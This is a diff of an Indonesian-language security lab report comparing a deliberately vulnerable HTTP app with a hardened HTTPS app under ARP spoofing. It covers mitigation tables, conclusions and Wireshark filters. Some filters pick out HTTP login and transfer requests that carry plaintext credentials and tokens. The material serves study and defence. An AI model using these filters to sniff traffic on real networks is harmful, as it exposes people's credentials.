-| TLS/HTTPS      | OpenSSL self-signed cert, TLS 1.2+ [16] | Tinggi — data terenkripsi   |
-| HSTS           | Helmet `maxAge: 31536000` [18]         | Tinggi — mencegah downgrade |
-| Strong Ciphers | `TLS_AES_256_GCM_SHA384`         | Tinggi — cipher modern      |
+| Solusi         | Implementasi                       | Efektivitas                  | Status |
+| -------------- | ---------------------------------- | ---------------------------- | ------ |
+| TLS/HTTPS      | OpenSSL self-signed cert, TLS 1.2+ [16] | Tinggi — data terenkripsi   | ✅ Impl. |
+| HSTS           | Helmet `maxAge: 31536000` [18]         | Tinggi — mencegah downgrade | ✅ Impl. |
+| Strong Ciphers | `TLS_AES_256_GCM_SHA384`         | Tinggi — cipher modern      | ✅ Impl. |
 
-#### Layer Aplikasi (Defense in Depth)
+#### Layer Aplikasi (Defense in Depth — Menjawab SEED Labs [5])
 
-| Solusi           | Implementasi                 | Efektivitas                  |
-| ---------------- | ---------------------------- | ---------------------------- |
-| Password Hashing | bcrypt (salt: 12 rounds) [20]    | Tinggi — irreversible       |
-| JWT Token        | jsonwebtoken (1h expiry) [19]    | Tinggi — stateless auth     |
-| Rate Limiting    | express-rate-limit (5/15min) | Sedang — anti brute force   |
-| Input Validation | express-validator            | Sedang — anti injection     |
-| Security Headers | Helmet (CSP, X-Frame, etc.) [10] | Sedang — anti XSS/clickjack |
-| CORS Restricted  | Origin whitelist             | Sedang — anti CSRF          |
+| Solusi           | Implementasi                 | Efektivitas                  | Status |
+| ---------------- | ---------------------------- | ---------------------------- | ------ |
+| Password Hashing | bcrypt (salt: 12 rounds) [20]    | Tinggi — irreversible       | ✅ Impl. |
+| JWT Token        | jsonwebtoken (1h expiry) [19]    | Tinggi — stateless auth     | ✅ Impl. |
+| Rate Limiting    | express-rate-limit (5/15min) | Sedang — anti brute force   | ✅ Impl. |
+| Input Validation | express-validator            | Sedang — anti injection     | ✅ Impl. |
+| Security Headers | Helmet (CSP, X-Frame, etc.) [10] | Sedang — anti XSS/clickjack | ✅ Impl. |
+| CORS Restricted  | Origin whitelist             | Sedang — anti CSRF          | ✅ Impl. |
+| Audit Logging    | MongoDB audit_logs (TTL 7d)  | Sedang — security monitoring | ✅ Impl. |
 
-#### Layer Network (Mencegah ARP Spoofing)
+#### Layer Data (Database Security — Microservices)
 
-| Solusi                 | Deskripsi                    | Implementasi          |
-| ---------------------- | ---------------------------- | --------------------- |
-| Static ARP Entries     | Menambahkan entri ARP statis | `arp -s <IP> <MAC>` |
-| Dynamic ARP Inspection | Fitur switch managed         | Pada network switch   |
-| Network Segmentation   | Memisahkan jaringan sensitif | VLAN, Tailscale ACL   |
-| VPN/Encrypted Tunnel   | Enkripsi seluruh traffic     | Tailscale, WireGuard  |
+Satu instance MongoDB melayani kedua aplikasi — mendemonstrasikan bahwa keamanan **bukan hanya soal infrastruktur** (database yang sama), tetapi bagaimana **aplikasi memperlakukan data sensitif**.
+
+| Aspek            | Vulnerable App (vulnerable_db)     | Secure App (secure_db)                 |
+| ---------------- | ---------------------------------- | -------------------------------------- |
+| Password Storage | Plaintext (`admin123`)             | Bcrypt hash (`$2b$12$...`)             |
+| Schema Validation| Tidak ada constraint               | unique, required, enum, minlength      |
+| Password in Query| `select: true` (default)           | `select: false` (harus eksplisit)      |
+| TTL pada Data    | Tidak ada                          | Transactions 24h, audit_logs 7d        |
+| Index            | Tidak ada                          | Unique index pada username             |
+| Error Response   | Stack trace + connection string    | Generic "Internal server error"        |
+| Audit Trail      | Tidak ada                          | Setiap login/transfer dicatat          |
+
+#### Layer Network (Mencegah/Mengurangi Dampak ARP Spoofing)
+
+| Solusi                   | Deskripsi                        | Implementasi          | Status |
+| ------------------------ | -------------------------------- | --------------------- | ------ |
+| VPN Management Plane     | SSH/DB hanya via WireGuard tunnel | Tailscale sidecar [8] | ✅ Impl. |
+| Network Segmentation     | Memisahkan data dan management plane | Docker bridge + VPN  | ✅ Impl. |
+| Static ARP Entries       | Menambahkan entri ARP statis     | `arp -s <IP> <MAC>`  | 📋 Rekomendasi |
+| Dynamic ARP Inspection   | Fitur switch managed             | Pada network switch   | 📋 Rekomendasi |
+| ML-based Detection       | Deteksi anomali ARP otomatis     | Random Forest [7]     | 🔮 Future Work |
+
+#### Keterkaitan Solusi dengan Penelitian Terdahulu
+
+| Keterbatasan Penelitian Terdahulu | Solusi yang Diimplementasikan | Referensi |
+| --------------------------------- | ----------------------------- | --------- |
+| Tidak ada versi aman sebagai pembanding [6] | Dual-stack microservices (HTTP vs HTTPS) + shared MongoDB | Section 3.2, 3.3 |
+| Kurang mitigasi layer aplikasi [5] | 7 kontrol keamanan aplikasi + database security | Section 4.7 |
+| Kompleksitas deployment ML detection [7] | .pcap dataset dan rule-based detection | Section 4.6 |
+| Docker bridge rentan ARP Spoofing [6] | Tailscale VPN management plane | Section 3.2 |
+| Tidak ada perbandingan penyimpanan data [6] | vulnerable_db (plaintext) vs secure_db (bcrypt) | Section 4.7 |
+
 
 ---
 
@@ -1205,8 +1201,9 @@ Pada tugas sebelumnya, analisis traffic menggunakan Wireshark menunjukkan:
 1. **ARP Spoofing tetap menjadi ancaman nyata** — Protokol ARP [11] yang stateless dan tanpa autentikasi memungkinkan serangan cache poisoning (T1557.002) [2] untuk mencapai posisi Man-in-the-Middle (T1557) [1].
 2. **HTTP tanpa enkripsi sangat rentan** — Demonstrasi membuktikan bahwa kredensial, token, dan data transaksi yang dikirim melalui HTTP [21] dapat diintersep dan dibaca dalam plaintext oleh penyerang (A04:2025 - Cryptographic Failures) [4].
 3. **HTTPS/TLS efektif melindungi data** — Meskipun ARP Spoofing berhasil, enkripsi TLS [16] memastikan data yang ditangkap tidak dapat dibaca, menjadikan serangan sniffing tidak efektif.
-4. **Defense in Depth diperlukan** — Keamanan yang komprehensif memerlukan perlindungan di semua layer: network (VLAN, DAI), transport (TLS) [16][17], dan aplikasi (JWT [19], bcrypt [20], rate limiting, security headers [10]).
-5. **Container networking memerlukan perhatian khusus** — Docker bridge network default rentan terhadap ARP spoofing antar container [6], sehingga diperlukan konfigurasi keamanan tambahan.
+4. **Defense in Depth diperlukan** — Keamanan yang komprehensif memerlukan perlindungan di semua layer: network (VLAN, DAI), transport (TLS) [16][17], aplikasi (JWT [19], bcrypt [20], rate limiting, security headers [10]), dan data (schema validation, audit logging).
+5. **Keamanan data ditentukan oleh layer aplikasi, bukan infrastruktur** — Menggunakan satu instance MongoDB yang sama, vulnerable app menyimpan password plaintext sementara secure app menyimpan bcrypt hash. Ini membuktikan bahwa keamanan bergantung pada bagaimana aplikasi memperlakukan data, bukan semata-mata pada teknologi database.
+6. **Container networking memerlukan perhatian khusus** — Docker bridge network default rentan terhadap ARP spoofing antar container [6], sehingga diperlukan konfigurasi keamanan tambahan.
 
 ### 5.2 Future Work
 
@@ -1261,8 +1258,8 @@ Daftar lengkap display filter Wireshark yang digunakan dalam penelitian ini untu
 | `arp.opcode == 2` | Hanya ARP Reply — serangan ARP Spoofing mengirim banyak Reply palsu |
 | `arp.duplicate-address-detected` | Mendeteksi duplikasi IP (satu IP memiliki >1 MAC) — indikasi spoofing |
 | `arp.isgratuitous == 1` | Gratuitous ARP (Reply tanpa Request) — sering dipakai dalam serangan |
-| `arp.src.proto_ipv4 == 100.x.x.x` | Filter ARP dari IP tertentu (ganti dengan IP target) |
-| `arp.dst.proto_ipv4 == 100.x.x.x` | Filter ARP ke IP tertentu (ganti dengan IP target) |
+| `arp.src.proto_ipv4 == 172.20.0.x` | Filter ARP dari IP tertentu (ganti dengan IP target) |
+| `arp.dst.proto_ipv4 == 172.20.0.x` | Filter ARP ke IP tertentu (ganti dengan IP target) |
 
 **Cara analisis:** Jika terlihat banyak ARP Reply dari satu MAC yang mengklaim IP berbeda-beda, itu adalah bukti ARP Cache Poisoning (T1557.002).
 
@@ -1275,7 +1272,7 @@ Daftar lengkap display filter Wireshark yang digunakan dalam penelitian ini untu
 | `http.request.uri contains "/api/login"` | Filter spesifik ke endpoint login |
 | `http.request.uri contains "/api/transfer"` | Filter ke endpoint transfer data |
 | `tcp.port == 5000 && http` | Traffic HTTP ke port 5000 (vulnerable backend) |
-| `ip.dst == 100.x.x.x && http` | Traffic HTTP ke IP vulnerable-app tertentu |
+| `ip.dst == 172.20.0.x && http` | Traffic HTTP ke IP vulnerable-app tertentu |
 | `http.request.method == "POST" && http.content_type contains "json"` | POST request dengan body JSON (berisi kredensial) |
 | `http.response.code == 200 && http.content_type contains "json"` | Response sukses yang berisi data user |
 
@@ -1332,6 +1329,6 @@ Capture filter dimasukkan di kolom **Capture Filter** SEBELUM klik Start. Berbed
 | `arp` | Hanya capture paket ARP |
 | `port 5000` | Hanya capture traffic HTTP (port 5000) |
 | `port 5443` | Hanya capture traffic HTTPS (port 5443) |
-| `host 100.x.x.x` | Hanya capture traffic dari/ke IP tertentu |
+| `host 172.20.0.x` | Hanya capture traffic dari/ke IP tertentu |
 | `arp or port 5000` | Capture ARP dan HTTP bersamaan |
 | `arp or port 5000 or port 5443` | Capture ARP, HTTP, dan HTTPS — **filter yang direkomendasikan** |
